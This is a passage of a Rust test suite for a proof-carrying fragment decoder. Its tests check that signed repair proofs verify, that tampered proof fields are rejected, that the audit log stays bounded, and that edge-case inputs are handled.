        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let mut proof = result.proof.expect("proof should be present");
        let mut tampered = proof.attestation.signature.clone();
        let replacement = if tampered.starts_with('a') { "b" } else { "a" };
        tampered.replace_range(0..1, replacement);
        proof.attestation.signature = tampered;

        let api = verification_api();
        let original_hashes: Vec<String> = frags.iter().map(|f| hex::encode(f.hash())).collect();

        let recomputed = output_hash_hex(&result.output_data);

        let v = api.verify(&proof, &original_hashes, &recomputed);
        assert!(!v.is_valid());
        assert_eq!(v.event_code(), REPAIR_PROOF_INVALID);
    }

    #[test]
    fn test_verify_invalid_payload_hash() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let mut proof = result.proof.expect("proof should be present");
        let mut tampered = proof.attestation.payload_hash.clone();
        let replacement = if tampered.starts_with('a') { "b" } else { "a" };
        tampered.replace_range(0..1, replacement);
        proof.attestation.payload_hash = tampered;

        let api = verification_api();
        let original_hashes: Vec<String> = frags.iter().map(|f| hex::encode(f.hash())).collect();

        let recomputed = output_hash_hex(&result.output_data);

        let v = api.verify(&proof, &original_hashes, &recomputed);
        assert!(!v.is_valid());
        assert_eq!(v.event_code(), REPAIR_PROOF_INVALID);
    }

    // ── Proof presence check tests ──

    #[test]
    fn test_presence_mandatory_with_proof() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let api = verification_api();
        let check =
            api.check_proof_presence(result.proof.as_ref(), ProofMode::Mandatory, "obj-001");
        assert!(check.is_ok());
    }

    #[test]
    fn test_presence_mandatory_without_proof() {
        let api = verification_api();
        let err = api
            .check_proof_presence(None, ProofMode::Mandatory, "obj-001")
            .unwrap_err();
        assert_eq!(err.code(), "PROOF_MISSING_MANDATORY");
    }

    #[test]
    fn test_presence_advisory_without_proof() {
        let api = verification_api();
        let check = api.check_proof_presence(None, ProofMode::Advisory, "obj-001");
        assert!(check.is_ok());
    }

    // ── VerificationResult tests ──

    #[test]
    fn test_verification_result_event_codes() {
        assert_eq!(
            VerificationResult::Valid.event_code(),
            REPAIR_PROOF_VERIFIED
        );
        assert_eq!(
            VerificationResult::MissingProof.event_code(),
            REPAIR_PROOF_MISSING
        );
        let inv = VerificationResult::InvalidSignature;
        assert_eq!(inv.event_code(), REPAIR_PROOF_INVALID);
    }

    // ── Serialization tests ──

    #[test]
    fn test_repair_proof_roundtrip() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let proof = result.proof.expect("proof should be present");
        let json = serde_json::to_string(&proof).unwrap();
        let parsed: RepairProof = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.object_id, proof.object_id);
        assert_hash_eq(&parsed.output_hash, &proof.output_hash);
    }

    #[test]
    fn test_decode_result_roundtrip() {
        let mut dec = decoder();
        let frags = test_fragments();
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let json = serde_json::to_string(&result).unwrap();
        let parsed: DecodeResult = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed.object_id, "obj-001");
    }

    #[test]
    fn test_proof_mode_roundtrip() {
        let json = serde_json::to_string(&ProofMode::Mandatory).unwrap();
        let parsed: ProofMode = serde_json::from_str(&json).unwrap();
        assert_eq!(parsed, ProofMode::Mandatory);
    }

    // ── Error display tests ──

    #[test]
    fn test_error_display_missing() {
        let err = ProofCarryingDecodeError::MissingProofInMandatoryMode {
            object_id: "obj-1".to_string(),
        };
        assert!(err.to_string().contains("PROOF_MISSING_MANDATORY"));
    }

    #[test]
    fn test_error_display_invalid() {
        let err = ProofCarryingDecodeError::InvalidProof {
            object_id: "obj-1".to_string(),
            reason: "bad hash".to_string(),
        };
        assert!(err.to_string().contains("PROOF_INVALID"));
    }

    #[test]
    fn test_error_display_reconstruction() {
        let err = ProofCarryingDecodeError::ReconstructionFailed {
            object_id: "obj-1".to_string(),
            reason: "no fragments".to_string(),
        };
        assert!(err.to_string().contains("RECONSTRUCTION_FAILED"));
    }

    // ── Determinism test (INV-REPAIR-PROOF-DETERMINISTIC) ──

    #[test]
    fn test_proof_deterministic() {
        let frags = test_fragments();
        let mut dec1 = decoder();
        let mut dec2 = decoder();
        let r1 = dec1
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let r2 = dec2
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        let p1 = r1.proof.unwrap();
        let p2 = r2.proof.unwrap();
        assert_hash_eq(&p1.output_hash, &p2.output_hash);
        assert_hash_eq(&p1.attestation.signature, &p2.attestation.signature);
    }

    // ── Metamorphic proof-binding tests ──

    #[test]
    fn mr_rechunking_same_bytes_preserves_output_hash_but_changes_proof_binding() {
        let left = vec![
            Fragment {
                fragment_id: "a".into(),
                data: vec![1, 2],
            },
            Fragment {
                fragment_id: "b".into(),
                data: vec![3, 4],
            },
        ];
        let right = vec![
            Fragment {
                fragment_id: "a".into(),
                data: vec![1],
            },
            Fragment {
                fragment_id: "b".into(),
                data: vec![2, 3, 4],
            },
        ];

        let left_result = decode_with("obj-rechunk", &left, 1000, "trace-a");
        let right_result = decode_with("obj-rechunk", &right, 1000, "trace-a");
        let left_proof = left_result.proof.as_ref().expect("proof should exist");
        let right_proof = right_result.proof.as_ref().expect("proof should exist");

        assert_eq!(left_result.output_data, right_result.output_data);
        assert_hash_eq(&left_proof.output_hash, &right_proof.output_hash);
        assert_ne!(
            left_proof.input_fragment_hashes,
            right_proof.input_fragment_hashes
        );
        assert_hash_ne(
            &left_proof.attestation.payload_hash,
            &right_proof.attestation.payload_hash,
        );
        assert_hash_ne(
            &left_proof.attestation.signature,
            &right_proof.attestation.signature,
        );
        assert_proof_valid(left_proof, &left, &left_result.output_data);
        assert_proof_valid(right_proof, &right, &right_result.output_data);
    }

    #[test]
    fn mr_appending_empty_fragment_preserves_output_hash_but_changes_proof_binding() {
        let base = vec![Fragment {
            fragment_id: "a".into(),
            data: vec![7, 8, 9],
        }];
        let mut with_empty = base.clone();
        with_empty.push(Fragment {
            fragment_id: "empty".into(),
            data: Vec::new(),
        });

        let base_result = decode_with("obj-empty", &base, 1000, "trace-a");
        let empty_result = decode_with("obj-empty", &with_empty, 1000, "trace-a");
        let base_proof = base_result.proof.as_ref().expect("proof should exist");
        let empty_proof = empty_result.proof.as_ref().expect("proof should exist");

        assert_eq!(base_result.output_data, empty_result.output_data);
        assert_hash_eq(&base_proof.output_hash, &empty_proof.output_hash);
        assert_eq!(base_proof.fragment_count + 1, empty_proof.fragment_count);
        assert_hash_ne(
            &base_proof.attestation.payload_hash,
            &empty_proof.attestation.payload_hash,
        );
        assert_proof_valid(base_proof, &base, &base_result.output_data);
        assert_proof_valid(empty_proof, &with_empty, &empty_result.output_data);
    }

    #[test]
    fn mr_fragment_order_changes_output_and_remains_self_consistent() {
        let original = vec![
            Fragment {
                fragment_id: "first".into(),
                data: vec![1, 2],
            },
            Fragment {
                fragment_id: "second".into(),
                data: vec![3],
            },
        ];
        let mut reordered = original.clone();
        reordered.reverse();

        let original_result = decode_with("obj-order", &original, 1000, "trace-a");
        let reordered_result = decode_with("obj-order", &reordered, 1000, "trace-a");
        let original_proof = original_result.proof.as_ref().expect("proof should exist");
        let reordered_proof = reordered_result.proof.as_ref().expect("proof should exist");

        assert_ne!(original_result.output_data, reordered_result.output_data);
        assert_hash_ne(&original_proof.output_hash, &reordered_proof.output_hash);
        assert_proof_valid(original_proof, &original, &original_result.output_data);
        assert_proof_valid(reordered_proof, &reordered, &reordered_result.output_data);
    }

    #[test]
    fn mr_trace_id_mutation_preserves_output_but_rekeys_attestation() {
        let fragments = test_fragments();

        let baseline = decode_with("obj-trace", &fragments, 1000, "trace-a");
        let transformed = decode_with("obj-trace", &fragments, 1000, "trace-b");
        let baseline_proof = baseline.proof.as_ref().expect("proof should exist");
        let transformed_proof = transformed.proof.as_ref().expect("proof should exist");

        assert_eq!(baseline.output_data, transformed.output_data);
        assert_hash_eq(&baseline_proof.output_hash, &transformed_proof.output_hash);
        assert_hash_ne(
            &baseline_proof.attestation.payload_hash,
            &transformed_proof.attestation.payload_hash,
        );
        assert_hash_ne(
            &baseline_proof.attestation.signature,
            &transformed_proof.attestation.signature,
        );
        assert_proof_valid(baseline_proof, &fragments, &baseline.output_data);
        assert_proof_valid(transformed_proof, &fragments, &transformed.output_data);
    }

    #[test]
    fn mr_timestamp_mutation_preserves_output_but_rekeys_attestation() {
        let fragments = test_fragments();

        let baseline = decode_with("obj-time", &fragments, 1000, "trace-a");
        let transformed = decode_with("obj-time", &fragments, 1001, "trace-a");
        let baseline_proof = baseline.proof.as_ref().expect("proof should exist");
        let transformed_proof = transformed.proof.as_ref().expect("proof should exist");

        assert_eq!(baseline.output_data, transformed.output_data);
        assert_hash_eq(&baseline_proof.output_hash, &transformed_proof.output_hash);
        assert_hash_ne(
            &baseline_proof.attestation.payload_hash,
            &transformed_proof.attestation.payload_hash,
        );
        assert_hash_ne(
            &baseline_proof.attestation.signature,
            &transformed_proof.attestation.signature,
        );
        assert_proof_valid(baseline_proof, &fragments, &baseline.output_data);
        assert_proof_valid(transformed_proof, &fragments, &transformed.output_data);
    }

    #[test]
    fn mr_object_id_mutation_preserves_output_but_rekeys_attestation() {
        let fragments = test_fragments();

        let baseline = decode_with("obj-a", &fragments, 1000, "trace-a");
        let transformed = decode_with("obj-b", &fragments, 1000, "trace-a");
        let baseline_proof = baseline.proof.as_ref().expect("proof should exist");
        let transformed_proof = transformed.proof.as_ref().expect("proof should exist");

        assert_eq!(baseline.output_data, transformed.output_data);
        assert_hash_eq(&baseline_proof.output_hash, &transformed_proof.output_hash);
        assert_hash_ne(
            &baseline_proof.attestation.payload_hash,
            &transformed_proof.attestation.payload_hash,
        );
        assert_hash_ne(
            &baseline_proof.attestation.signature,
            &transformed_proof.attestation.signature,
        );
        assert_proof_valid(baseline_proof, &fragments, &baseline.output_data);
        assert_proof_valid(transformed_proof, &fragments, &transformed.output_data);
    }

    #[test]
    fn mr_tampering_object_id_invalidates_bound_attestation() {
        let fragments = test_fragments();
        let result = decode_with("obj-original", &fragments, 1000, "trace-a");
        let mut proof = result.proof.expect("proof should exist");
        proof.object_id = "obj-forged".into();

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert_eq!(verification, VerificationResult::InvalidSignature);
    }

    #[test]
    fn mr_tampering_fragment_count_invalidates_bound_attestation() {
        let fragments = test_fragments();
        let result = decode_with("obj-count", &fragments, 1000, "trace-a");
        let mut proof = result.proof.expect("proof should exist");
        proof.fragment_count = proof.fragment_count.saturating_add(1);

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert_eq!(verification, VerificationResult::InvalidSignature);
    }

    #[test]
    fn mr_tampering_signer_id_invalidates_bound_attestation() {
        let fragments = test_fragments();
        let result = decode_with("obj-signer", &fragments, 1000, "trace-a");
        let mut proof = result.proof.expect("proof should exist");
        proof.attestation.signer_id = "forged-signer".into();

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert_eq!(verification, VerificationResult::InvalidSignature);
    }

    #[test]
    fn mr_audit_log_capacity_preserves_latest_suffix_under_extra_decodes() {
        let mut dec = ProofCarryingDecoder::with_audit_log_capacity(
            ProofMode::Mandatory,
            "test-signer",
            "test-secret",
            3,
        );
        let fragments = test_fragments();

        for idx in 0..6 {
            dec.decode(
                &format!("obj-{idx}"),
                &fragments,
                &AlgorithmId::new("simple_concat"),
                1000 + idx,
                &format!("trace-{idx}"),
            )
            .expect("decode should succeed");
        }

        let retained: Vec<&str> = dec
            .audit_log()
            .iter()
            .map(|event| event.object_id.as_str())
            .collect();
        assert_eq!(retained, vec!["obj-3", "obj-4", "obj-5"]);
    }

    #[test]
    fn mr_push_bounded_zero_capacity_drops_existing_and_new_items() {
        let mut items = vec![1, 2, 3];

        push_bounded(&mut items, 4, 0);

        assert!(items.is_empty());
    }

    // ── Multiple decodes test ──

    #[test]
    fn test_multiple_decodes_audit_log() {
        let mut dec = decoder();
        let frags = test_fragments();
        dec.decode(
            "obj-001",
            &frags,
            &AlgorithmId::new("simple_concat"),
            1000,
            "t-1",
        )
        .unwrap();
        dec.decode(
            "obj-002",
            &frags,
            &AlgorithmId::new("simple_concat"),
            1001,
            "t-2",
        )
        .unwrap();
        assert_eq!(dec.audit_log().len(), 2);
    }

    #[test]
    fn test_audit_log_capacity_enforces_oldest_first_eviction() {
        let mut dec = ProofCarryingDecoder::with_audit_log_capacity(
            ProofMode::Mandatory,
            "test-signer",
            "test-secret",
            2,
        );
        let frags = test_fragments();
        dec.decode(
            "obj-001",
            &frags,
            &AlgorithmId::new("simple_concat"),
            1000,
            "t-1",
        )
        .unwrap();
        dec.decode(
            "obj-002",
            &frags,
            &AlgorithmId::new("simple_concat"),
            1001,
            "t-2",
        )
        .unwrap();
        dec.decode(
            "obj-003",
            &frags,
            &AlgorithmId::new("simple_concat"),
            1002,
            "t-3",
        )
        .unwrap();

        assert_eq!(dec.audit_log().len(), 2);
        let object_ids: Vec<&str> = dec
            .audit_log()
            .iter()
            .map(|event| event.object_id.as_str())
            .collect();
        assert_eq!(object_ids, vec!["obj-002", "obj-003"]);
    }

    // ── Single fragment test ──

    #[test]
    fn test_decode_single_fragment() {
        let mut dec = decoder();
        let frags = vec![Fragment {
            fragment_id: "single".into(),
            data: vec![0xFF; 8],
        }];
        let result = dec
            .decode(
                "obj-001",
                &frags,
                &AlgorithmId::new("simple_concat"),
                1000,
                "t-1",
            )
            .unwrap();
        assert_eq!(result.output_data, vec![0xFF; 8]);
        assert_eq!(result.proof.unwrap().fragment_count, 1);
    }

    #[test]
    fn negative_extra_fragment_digest_in_proof_is_rejected_by_count() {
        let fragments = test_fragments();
        let result = decode_with("obj-extra-digest", &fragments, 1000, "trace-extra");
        let mut proof = result.proof.expect("proof should exist");
        proof
            .input_fragment_hashes
            .push("forged-extra-digest".into());

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert!(matches!(
            verification,
            VerificationResult::InvalidFragmentHash {
                index: 0,
                expected,
                actual,
            } if expected == "count=3" && actual == "count=4"
        ));
    }

    #[test]
    fn negative_missing_fragment_digest_in_proof_is_rejected_by_count() {
        let fragments = test_fragments();
        let result = decode_with("obj-missing-digest", &fragments, 1000, "trace-missing");
        let mut proof = result.proof.expect("proof should exist");
        proof.input_fragment_hashes.pop();

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert!(matches!(
            verification,
            VerificationResult::InvalidFragmentHash {
                index: 0,
                expected,
                actual,
            } if expected == "count=3" && actual == "count=2"
        ));
    }

    #[test]
    fn negative_reordered_fragment_digests_are_rejected_before_signature() {
        let fragments = test_fragments();
        let result = decode_with("obj-reordered", &fragments, 1000, "trace-reordered");
        let mut proof = result.proof.expect("proof should exist");
        proof.input_fragment_hashes.swap(0, 1);

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert!(matches!(
            verification,
            VerificationResult::InvalidFragmentHash { index: 0, .. }
        ));
    }

    #[test]
    fn negative_registered_algorithm_swap_invalidates_attestation() {
        let fragments = test_fragments();
        let result = decode_with("obj-algo-swap", &fragments, 1000, "trace-algo-swap");
        let mut proof = result.proof.expect("proof should exist");
        proof.algorithm_id = AlgorithmId::new("xor_parity_2");

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert_eq!(verification, VerificationResult::InvalidSignature);
    }

    #[test]
    fn negative_wrong_signing_secret_rejects_otherwise_valid_proof() {
        let fragments = test_fragments();
        let result = decode_with("obj-wrong-secret", &fragments, 1000, "trace-wrong-secret");
        let proof = result.proof.expect("proof should exist");
        let registered_algorithms = decoder().registered_algorithms().to_vec();
        let api = ProofVerificationApi::new("wrong-secret", registered_algorithms);

        let verification = api.verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert_eq!(verification, VerificationResult::InvalidSignature);
    }

    #[test]
    fn negative_unregistered_algorithm_decode_leaves_audit_empty() {
        let mut dec = decoder();
        let fragments = test_fragments();

        let err = dec
            .decode(
                "obj-unregistered",
                &fragments,
                &AlgorithmId::new("unknown_algo"),
                1000,
                "trace-unregistered",
            )
            .unwrap_err();

        assert_eq!(err.code(), "RECONSTRUCTION_FAILED");
        assert!(dec.audit_log().is_empty());
    }

    #[test]
    fn negative_empty_fragment_decode_leaves_audit_empty() {
        let mut dec = decoder();

        let err = dec
            .decode(
                "obj-empty-fragments",
                &[],
                &AlgorithmId::new("simple_concat"),
                1000,
                "trace-empty-fragments",
            )
            .unwrap_err();

        assert_eq!(err.code(), "RECONSTRUCTION_FAILED");
        assert!(dec.audit_log().is_empty());
    }

    #[test]
    fn negative_tampered_timestamp_invalidates_bound_attestation() {
        let fragments = test_fragments();
        let result = decode_with("obj-forged-time", &fragments, 1000, "trace-forged-time");
        let mut proof = result.proof.expect("proof should exist");
        proof.timestamp_epoch_secs = proof.timestamp_epoch_secs.saturating_add(60);

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert_eq!(verification, VerificationResult::InvalidSignature);
    }

    #[test]
    fn negative_tampered_trace_id_invalidates_bound_attestation() {
        let fragments = test_fragments();
        let result = decode_with("obj-forged-trace", &fragments, 1000, "trace-original");
        let mut proof = result.proof.expect("proof should exist");
        proof.trace_id = "trace-forged".into();

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert_eq!(verification, VerificationResult::InvalidSignature);
    }

    #[test]
    fn negative_tampered_output_hash_is_rejected_before_signature_check() {
        let fragments = test_fragments();
        let result = decode_with("obj-forged-output", &fragments, 1000, "trace-output");
        let mut proof = result.proof.expect("proof should exist");
        proof.output_hash = output_hash_hex(b"forged-output");
        let recomputed = output_hash_hex(&result.output_data);

        let verification =
            verification_api().verify(&proof, &original_hashes(&fragments), &recomputed);

        assert_eq!(
            verification,
            VerificationResult::OutputHashMismatch {
                expected: recomputed,
                actual: proof.output_hash,
            }
        );
    }

    #[test]
    fn negative_tampered_proof_fragment_digest_reports_actual_digest() {
        let fragments = test_fragments();
        let result = decode_with("obj-forged-fragment", &fragments, 1000, "trace-fragment");
        let mut proof = result.proof.expect("proof should exist");
        let expected = original_hashes(&fragments);
        proof.input_fragment_hashes[1] = "forged-fragment-digest".into();

        let verification =
            verification_api().verify(&proof, &expected, &output_hash_hex(&result.output_data));

        assert_eq!(
            verification,
            VerificationResult::InvalidFragmentHash {
                index: 1,
                expected: expected[1].clone(),
                actual: "forged-fragment-digest".into(),
            }
        );
    }

    #[test]
    fn negative_verifier_registry_missing_algorithm_rejects_valid_proof() {
        let fragments = test_fragments();
        let result = decode_with("obj-registry-miss", &fragments, 1000, "trace-registry");
        let proof = result.proof.expect("proof should exist");
        let api = ProofVerificationApi::new("test-secret", vec![AlgorithmId::new("xor_parity_2")]);

        let verification = api.verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        assert_eq!(
            verification,
            VerificationResult::UnknownAlgorithm {
                algorithm_id: AlgorithmId::new("simple_concat"),
            }
        );
    }

    #[test]
    fn negative_mandatory_missing_proof_error_mentions_object_id() {
        let api = verification_api();
        let err = api
            .check_proof_presence(None, ProofMode::Mandatory, "obj-missing-proof")
            .unwrap_err();

        assert_eq!(err.code(), "PROOF_MISSING_MANDATORY");
        assert!(err.to_string().contains("obj-missing-proof"));
    }

    // =========================================================================
    // ADDITIONAL NEGATIVE-PATH EDGE CASE TESTS
    // =========================================================================

    #[test]
    fn negative_extremely_large_fragment_data_saturates_gracefully() {
        let mut dec = decoder();
        // Create a fragment with 10MB of data
        let large_fragment = Fragment {
            fragment_id: "massive-fragment".to_string(),
            data: vec![0xAA; 10_000_000], // 10MB
        };

        let result = dec.decode(
            "obj-massive",
            &[large_fragment],
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-massive",
        );

        // Should handle large data without panicking
        assert!(result.is_ok(), "Large fragment decode should succeed");
        let decode_result = result.unwrap();
        assert_eq!(decode_result.output_data.len(), 10_000_000);
        assert!(decode_result.proof.is_some());

        // Audit log should contain entry without crashing
        assert_eq!(dec.audit_log().len(), 1);
    }

    #[test]
    fn negative_fragment_with_null_bytes_in_id_handled_correctly() {
        let mut dec = decoder();
        let null_byte_fragment = Fragment {
            fragment_id: "frag\x00\x01\x02-with-nulls".to_string(),
            data: vec![0x42; 16],
        };

        let result = dec.decode(
            "obj-null-bytes",
            &[null_byte_fragment.clone()],
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-null-bytes",
        );

        assert!(result.is_ok());
        let proof = result.unwrap().proof.expect("proof should exist");

        // Fragment hash should be deterministic even with null bytes
        let expected_hash = hex::encode(null_byte_fragment.hash());
        assert_eq!(proof.input_fragment_hashes[0], expected_hash);
    }

    #[test]
    fn negative_object_id_with_unicode_and_special_chars_preserved() {
        let mut dec = decoder();
        let fragments = test_fragments();
        let unicode_object_id = "obj-🦀-ñoño-测试-עברית-🔒";

        let result = dec.decode(
            unicode_object_id,
            &fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-unicode",
        );

        assert!(result.is_ok());
        let decode_result = result.unwrap();
        assert_eq!(decode_result.object_id, unicode_object_id);
        let proof = decode_result.proof.expect("proof should exist");
        assert_eq!(proof.object_id, unicode_object_id);

        // Should verify correctly with unicode object ID
        assert_proof_valid(&proof, &fragments, &decode_result.output_data);
    }

    #[test]
    fn negative_timestamp_overflow_u64_max_handled_gracefully() {
        let mut dec = decoder();
        let fragments = test_fragments();

        let result = dec.decode(
            "obj-time-overflow",
            &fragments,
            &AlgorithmId::new("simple_concat"),
            u64::MAX,
            "trace-time-overflow",
        );

        assert!(result.is_ok());
        let proof = result.unwrap().proof.expect("proof should exist");
        assert_eq!(proof.timestamp_epoch_secs, u64::MAX);

        // Should still generate valid signature with extreme timestamp
        assert!(!proof.attestation.signature.is_empty());
        assert!(!proof.attestation.payload_hash.is_empty());
    }

    #[test]
    fn negative_trace_id_with_control_characters_hashed_consistently() {
        let mut dec = decoder();
        let fragments = test_fragments();
        let control_trace_id = "trace\x07\x08\x0C\x1F-control-chars";

        let result = dec.decode(
            "obj-control",
            &fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            control_trace_id,
        );

        assert!(result.is_ok());
        let proof = result.unwrap().proof.expect("proof should exist");
        assert_eq!(proof.trace_id, control_trace_id);

        // Control characters should not break hash computation
        assert!(!proof.attestation.payload_hash.is_empty());
        assert!(proof.attestation.payload_hash.chars().all(|c| c.is_ascii_hexdigit()));
    }

    #[test]
    fn negative_algorithm_registration_exceeds_max_capacity_gracefully() {
        let mut dec = decoder();
        let initial_count = dec.registered_algorithms().len();

        // Register algorithms up to and beyond MAX_REGISTERED_ALGORITHMS
        for i in 0..MAX_REGISTERED_ALGORITHMS.saturating_add(10) {
            dec.register_algorithm(AlgorithmId::new(format!("algo-{i}")));
        }

        // Should not exceed maximum capacity
        assert!(dec.registered_algorithms().len() <= MAX_REGISTERED_ALGORITHMS);

        // Latest algorithms should be preserved (oldest dropped)
        let last_algo = AlgorithmId::new(format!("algo-{}", MAX_REGISTERED_ALGORITHMS.saturating_add(9)));
        assert!(dec.registered_algorithms().contains(&last_algo));

        // Original algorithms may have been evicted
        let final_count = dec.registered_algorithms().len();
        assert!(final_count <= MAX_REGISTERED_ALGORITHMS);
    }

    #[test]
    fn negative_empty_algorithm_id_string_handled_correctly() {
        let mut dec = decoder();
        let fragments = test_fragments();

        // Register empty algorithm ID
        dec.register_algorithm(AlgorithmId::new(""));

        let result = dec.decode(
            "obj-empty-algo",
            &fragments,
            &AlgorithmId::new(""),
            1000,
            "trace-empty-algo",
        );

        assert!(result.is_ok());
        let proof = result.unwrap().proof.expect("proof should exist");
        assert_eq!(proof.algorithm_id.as_str(), "");

        // Empty algorithm ID should still produce valid attestation
        assert!(!proof.attestation.signature.is_empty());
        assert!(!proof.attestation.payload_hash.is_empty());
    }

    #[test]
    fn negative_fragment_with_maximum_size_data_vector_handled() {
        let mut dec = decoder();
        // Create fragment with data that approaches system limits
        let huge_data_size = 50_000_000; // 50MB
        let huge_fragment = Fragment {
            fragment_id: "huge-data".to_string(),
            data: vec![0x55; huge_data_size],
        };

        let result = dec.decode(
            "obj-huge-data",
            &[huge_fragment.clone()],
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-huge-data",
        );

        // Should either succeed or fail gracefully (not panic)
        match result {
            Ok(decode_result) => {
                assert_eq!(decode_result.output_data.len(), huge_data_size);
                let proof = decode_result.proof.expect("proof should exist");
                assert_eq!(proof.fragment_count, 1);

                // Hash should be computed correctly even for huge data
                let expected_hash = hex::encode(huge_fragment.hash());
                assert_eq!(proof.input_fragment_hashes[0], expected_hash);
            }
            Err(err) => {
                // If it fails, should be a proper error, not a panic
                assert!(matches!(err, ProofCarryingDecodeError::ReconstructionFailed { .. }));
            }
        }
    }

    #[test]
    fn negative_verification_with_malformed_hex_signature_rejects_gracefully() {
        let fragments = test_fragments();
        let result = decode_with("obj-malformed-hex", &fragments, 1000, "trace-malformed");
        let mut proof = result.proof.expect("proof should exist");

        // Insert non-hex characters in signature
        proof.attestation.signature = "ggggzzzz-not-hex-!!!".to_string();

        let verification = verification_api().verify(
            &proof,
            &original_hashes(&fragments),
            &output_hash_hex(&result.output_data),
        );

        // Should reject as invalid signature (not panic on hex decode)
        assert_eq!(verification, VerificationResult::InvalidSignature);
    }

    #[test]
    fn negative_audit_log_with_extremely_long_object_ids_bounded_correctly() {
        let mut dec = ProofCarryingDecoder::with_audit_log_capacity(
            ProofMode::Mandatory,
            "test-signer",
            "test-secret",
            5,
        );
        let fragments = test_fragments();

        // Create objects with extremely long IDs
        for i in 0..3 {
            let long_id = format!("obj-{}-{}", "x".repeat(1000), i);
            let result = dec.decode(
                &long_id,
                &fragments,
                &AlgorithmId::new("simple_concat"),
                1000 + i as u64,
                &format!("trace-{i}"),
            );
            assert!(result.is_ok());
        }

        // Audit log should handle long object IDs without issues
        assert_eq!(dec.audit_log().len(), 3);
        for entry in dec.audit_log() {
            assert!(entry.object_id.len() > 1000);
            assert_eq!(entry.event_code, REPAIR_PROOF_EMITTED);
        }
    }

    #[test]
    fn negative_proof_id_generation_with_short_output_hash_handled() {
        let mut dec = decoder();
        // Create a scenario that might produce a very short hash (edge case)
        let tiny_fragment = Fragment {
            fragment_id: "".to_string(), // Empty ID
            data: Vec::new(),            // Empty data
        };

        let result = dec.decode(
            "",  // Empty object ID
            &[tiny_fragment],
            &AlgorithmId::new("simple_concat"),
            0,   // Zero timestamp
            "",  // Empty trace ID
        );

        assert!(result.is_ok());
        let proof = result.unwrap().proof.expect("proof should exist");

        // Proof ID should still be generated correctly even with empty inputs
        assert!(proof.proof_id.starts_with("rp-"));
        assert!(proof.proof_id.len() >= 3); // "rp-" + at least some chars

        // Should still have valid hashes despite empty inputs
        assert!(!proof.output_hash.is_empty());
        assert_eq!(proof.input_fragment_hashes.len(), 1);
    }

    // ---------------------------------------------------------------
    // Additional Negative-Path Tests
    // ---------------------------------------------------------------

    #[test]
    fn negative_decode_with_unregistered_algorithm_fails() {
        let mut dec = decoder();
        let fragments = vec![Fragment::new("frag1", b"data1")];

        let result = dec.decode(
            "test-obj",
            &fragments,
            &AlgorithmId::new("unregistered_algorithm"),
            1000,
            "trace-1",
        );

        assert!(result.is_err());
        match result.unwrap_err() {
            ProofCarryingDecodeError::ReconstructionFailed { object_id, reason } => {
                assert_eq!(object_id, "test-obj");
                assert!(reason.contains("unregistered algorithm"));
                assert!(reason.contains("unregistered_algorithm"));
            }
            other => panic!("expected ReconstructionFailed, got {other:?}"),
        }
    }

    #[test]
    fn negative_decode_with_empty_fragments_fails() {
        let mut dec = decoder();
        let empty_fragments: Vec<Fragment> = vec![];

        let result = dec.decode(
            "test-obj",
            &empty_fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-1",
        );

        assert!(result.is_err());
        match result.unwrap_err() {
            ProofCarryingDecodeError::ReconstructionFailed { object_id, reason } => {
                assert_eq!(object_id, "test-obj");
                assert!(reason.contains("no fragments provided"));
            }
            other => panic!("expected ReconstructionFailed, got {other:?}"),
        }

        // Should not have emitted any audit events for failed decode
        assert!(dec.audit_log().is_empty());
    }

    #[test]
    fn negative_fragment_with_malformed_data_handles_gracefully() {
        let mut dec = decoder();

        // Create fragments with potentially problematic data
        let malformed_fragments = vec![
            Fragment { fragment_id: "null-bytes".into(), data: vec![0, 1, 2, 0, 3] },
            Fragment { fragment_id: "high-bytes".into(), data: vec![255, 254, 253, 252] },
            Fragment { fragment_id: "empty".into(), data: vec![] },
        ];

        let result = dec.decode(
            "malformed-test",
            &malformed_fragments,
            &AlgorithmId::new("simple_concat"),
            1000,
            "trace-malformed",
        );

        // Should handle malformed data without panicking
        assert!(result.is_ok());
